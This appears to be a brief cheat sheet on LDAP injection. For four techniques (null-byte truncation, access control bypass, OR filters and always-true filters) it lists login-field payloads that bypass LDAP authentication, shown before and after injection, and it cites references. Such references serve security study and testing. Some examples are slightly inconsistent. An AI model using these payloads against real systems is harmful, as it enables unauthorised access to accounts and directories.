# LDAP

> LDAP is an open, vendor-neutral, industry standard application protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network

# LDAP Injection

## NULL Byte

```
(&(username=hermes)(password=pass))     # before
username=*))%00&password=pass           # injection
(&(username=*))%00)(password=pass))     # after
```

## Basic Access Control Bypass

Here, `(&)` is the only filter passed to LDAP
```
(&(username=hermes)(password=pass))     # before
username=hermes)(&))&password=pass      # injection
(&(username=hermes)(&))(password=pass)  # after
```

## OR `|`

```
(&(username=hermes)(password=pass))             # before
username=*)(|(userPassword=*&password=pass)     # injection
(&(username=*)(|(password=*)(password=pass)))   # after
```

## Always True

```
(&(username=hermes)(password=pass)) 
username=*)(&&password=*)(&
(&(username=*)(&)(password=*)(&))
```

# References

- [Wiki](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)

- [LDAP Injection & Blind LDAP Injection In Web Applications](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/LDAP%20Injection%20and%20Blind%20LDAP%20Injection.pdf)